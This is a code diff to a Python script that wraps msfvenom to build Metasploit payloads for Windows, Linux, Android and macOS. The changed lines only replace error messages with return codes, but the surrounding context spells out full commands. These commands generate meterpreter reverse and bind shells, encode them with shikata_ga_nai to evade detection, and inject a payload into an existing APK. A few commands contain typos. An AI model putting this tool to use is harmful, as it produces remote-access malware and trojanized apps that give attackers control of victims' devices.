@@ -3,6 +3,7 @@ import os
 
 def windows(namder):
     if namder == 1:
+        a = 1
         port = int(input('lport: '))
         directory = str(input('dir save: '))
         b = list(directory)
@@ -14,6 +15,7 @@ def windows(namder):
             f'msfvenom -p windows/meterpreter/bind_tcp lport={port} -e x86/shikata_ga_nai -i 5 -f exe > {directory}{name}.exe', shell=True)
     
     elif (namder == 2) or (namder == 4) or (namder == 5) or (namder == 7) or (namder == 8):
+        a = 1
         host = str(input('lhost: '))
         port = int(input('lport: '))
         directory = str(input('dir save: '))
@@ -39,6 +41,7 @@ def windows(namder):
                 f'msfvenom -p cmd/windows/reverse_powershell lhost={host} lport={port} -e x86/shikata_ga_nai -i 5 > {directory}{name}.bat', shell=True)
     
     elif namder == 3:
+        a = 1
         host = str(input('lhost: '))
         directory = str(input('dir save: '))
         b = list(directory)
@@ -50,17 +53,22 @@ def windows(namder):
             f'msfvenom -p windows/meterpreter/reverse_https lhost={host} lport=443 -e x86/shikata_ga_nai -i 5 -f exe > {directiry}{name}.exe', shell=True)
     
     elif namder == 6:
+        a = 1
         host = str(input('lhost: '))
         port = int(input('lport: '))
 
         subprocess.call(
             f'msfvenom -p windows/meterpreter/reverse_tcp lhost={host} lport={port} -e x86/shikata_ga_nai -i 5 -f vba', shell=True)
     
+    
     else:
-        print('\nError')
+        a = 0
+    
+    return a
 
 def linux(namder):
     if (namder == 1) or (namder == 2):
+        a = 1
         host = str(input('lhost: '))
         port = int(input('lport: '))
         directory = str(input('dir save: '))
@@ -77,6 +85,7 @@ def linux(namder):
                 f'msfvenom -p python/meterpreter/reverse_tcp lhost={host} lport={port} -e x86/shikata_ga_nai -i 5 -f py > {directory}{name}.py', shell=True)
     
     elif namder == 3:
+        a = 1
         port = int(input('lport: '))
         directory = str(input('dir save: '))
         b = list(directory)
@@ -88,11 +97,14 @@ def linux(namder):
             f'msfvenom -p linux/x86/meterpreter/bind_tcp lport={port} -e x86/shikata_ga_nai -i 5 - f elf > {directory}{name}', shell=True)
     
     else:
-        print('\nError')
+        a = 0
+        
+    return a
 
 
 def android(namder):
     if namder == 1:
+        a = 1
         host = str(input('lhost: '))
         port = int(input('lport: '))
         directory = str(input('dir save: '))
@@ -105,6 +117,7 @@ def android(namder):
             f'msfvenom -p android/meterpreter/reverse_tcp lhost={host} lport={port} > {directory}{name}.apk', shell=True)
     
     elif namder == 2:
+        a = 1
         host = str(input('lhost: '))
         port = str(input('lport: '))
         directory = str(input('Original apk: '))
@@ -127,12 +140,15 @@ def android(namder):
         os.remove('tools/dir_apk.txt')
     
     else:
-        print('\nError')
+        a = 0
+    
+    return a
 
         
 
 def mac(namder):
     if namder == 1:
+        a = 1
         host = str(input('lhost: '))
         port = int(input('lport: '))
         directory = str(input('dir save: '))
@@ -145,6 +161,7 @@ def mac(namder):
             f'msfvenom -p osx/x64/meterpreter/reverse_tcp lhost={host} lport={port} -e x86/shikata_ga_nai -i 5 -f macho > {directory}{name}.macho')
     
     elif namder == 2:
+        a = 1
         port = int(input('lport: '))
         directory = str(input('dir save: '))
         b = list(directory)
@@ -156,4 +173,6 @@ def mac(namder):
             f'msfvenom -p osx/x64/meterpreter/bind_tcp lport={port} -e x86/shikata_ga_nai -i 5 -f macho > {directory}{name}.macho')
     
     else:
-        print('\nError')
+        a = 0
+    
+    return a
